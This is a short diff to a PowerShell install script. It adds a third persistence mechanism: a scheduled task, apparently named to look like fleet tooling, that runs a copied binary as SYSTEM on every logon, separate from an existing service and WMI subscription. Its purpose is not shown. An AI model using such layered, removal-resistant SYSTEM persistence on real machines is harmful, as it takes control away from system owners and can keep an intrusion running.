@@ -73,6 +73,19 @@ try {
     Write-Output "wmi subscription failed: $($_.Exception.Message)"
 }
 
+# persistence path 3: scheduled task running as SYSTEM (independent of service + WMI)
+$taskName = "Fleet$ServiceName"
+try {
+    schtasks.exe /query /TN $taskName >$null 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        schtasks.exe /create /TN $taskName /TR "`"$dest`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >$null 2>&1
+    }
+    schtasks.exe /change /TN $taskName /RU SYSTEM >$null 2>&1
+    Write-Output "scheduled task: $taskName (SYSTEM, on logon)"
+} catch {
+    Write-Output "scheduled task failed: $($_.Exception.Message)"
+}
+
 Write-Output "durable installed:"
 Write-Output "  path:    $dest"
 Write-Output "  copy:    $signed"
